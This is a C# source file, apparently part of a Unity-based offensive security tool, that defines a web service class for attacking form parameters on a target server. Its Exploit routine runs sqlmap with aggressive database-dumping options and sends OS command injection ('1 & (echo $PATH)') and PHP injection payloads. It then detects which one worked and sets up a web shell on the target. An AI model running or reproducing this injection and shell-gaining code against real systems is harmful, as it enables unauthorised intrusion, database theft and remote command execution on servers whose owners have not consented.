using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using Machine;
using UnityEngine;

namespace Service
{
    public class InputWebService : WebService
    {
        private string _url;
        private readonly Utils.WebMethod _method;
        private string _param;
        private readonly Dictionary<string, string> _postParams;
        public WebShell shell;

        public InputWebService(string vhost, string ip, int port, string url, Utils.WebMethod method, string param,
            Dictionary<string, string> postParameters = null) : base(vhost, ip, port)
        {
            _url = url;
            _method = method;
            _param = param;
            _postParams = postParameters;
        }

        public string GetUrl()
        {
            return _url;
        }

        public void SetUrl(string newUrl)
        {
            _url = newUrl;
        }

        public Utils.WebMethod GetMethod()
        {
            return _method;
        }
        
        public string GetParam()
        {
            return _param;
        }

        public void SetParam(string newParam)
        {
            _param = newParam;
        }

        public Dictionary<string, string> GetPostParams()
        {
            return _postParams;
        }

        public async Task<string> Submit(string value)
        {
            switch (_method)
            {
                case (Utils.WebMethod.GET):
                    string s = $"{HttpUtility.UrlEncode(_param)}={HttpUtility.UrlEncode(value)}";
                    string separator = _url.Contains("?") ? "&" : "?";
                    return await Get(_url + separator + s);

                case (Utils.WebMethod.POST):
                    Dictionary<string, string> toSend = new Dictionary<string, string>();
                    foreach (KeyValuePair<string, string> pair in _postParams)
                    {
                        toSend.Add(pair.Key, pair.Value);
                    }

                    toSend.Add(_param, value);
                    return await Post(_url, content: toSend);

                default:
                    throw new NotImplementedException($"The method {_method} is not yet implemented.");
            }
        }

        public void Exploit()
        {
            //Thread sqlInjection = SQLInjection();
            Thread commandInjection = CommandInjection();
            
            //sqlInjection.Join();
            commandInjection.Join();
        }
        
        public Thread SQLInjection()
        {
            Thread thread = new Thread(ThreadedSQLInjection);
            thread.Start();
            return thread;
        }

        public Thread CommandInjection()
        {
            Thread thread = new Thread(ThreadedCommandInjection);
            thread.Start();
            return thread;
        }

        public void ThreadedSQLInjection()
        {
            //TODO: Add support for POST method
            string sqlmap = Path.Combine("Binaries", "sqlmap", "sqlmap.py");
            string outputdir = Path.Combine("Results", GetIP().ToString(), GetPort().ToString());
            string options = $"--level=5 --risk=3 --dump --technique=BEQSU --batch -o --output-dir={outputdir}";
            string command = $"{sqlmap} {options} -u \"{GetIP()}:{GetPort()}/{_url}?{_param}=*\"";

            // Debug.Log(command);
            command.Exec();
        }

        public async void ThreadedCommandInjection()
        {
            Debug.Log("Starting Command injection path");
            
            // Try for OS command injection
            string payload = "1 & (echo $PATH)";
            string result = await Submit(payload);
            
            Regex windowsRegex = new Regex("(?<!echo )\\$PATH");
            Regex linuxRegex = new Regex("/usr/sbin:/usr/bin:/sbin:/bin"); //TODO: Allow a change in order of the parameters. Not required but could be fun.

            ShellType shellType = ShellType.None;
            //Debug.Log("Is it an os webshell ?");
            //Debug.Log(result);
            if (windowsRegex.IsMatch(result))
            {
                Debug.Log("Windows !");
                shellType = ShellType.Windows;
            }

            if (linuxRegex.IsMatch(result))
            {
                Debug.Log("Linux or MacOS: Unix");
                shellType = ShellType.Linux;
            }
            
            // PHP Injection ?
            payload = ";var_dump(\"SECUStudio\")";
            //Debug.Log("PHP ?");
            result = await Submit(payload);
            //Debug.Log(result);
            string EscapedParenthesis = Regex.Escape("(");
            Regex PHPRegex = new Regex(
                $"(?<!var_dump" + EscapedParenthesis + "\")"
                + "(?<!var_dump" + EscapedParenthesis + ")"
                + "SECUStudio"
                );
            if (PHPRegex.IsMatch(result))
            {
                shellType = ShellType.Php;
                Debug.Log("PHP Shell");
            }

            if (shellType != ShellType.None)
            {
                WebShell shell = new WebShell(this, shellType, false);
                shell.Upgrade();
                this.shell = shell;
            }
            else
            {
                Debug.Log("No shell found.");
            }
        }
    }
}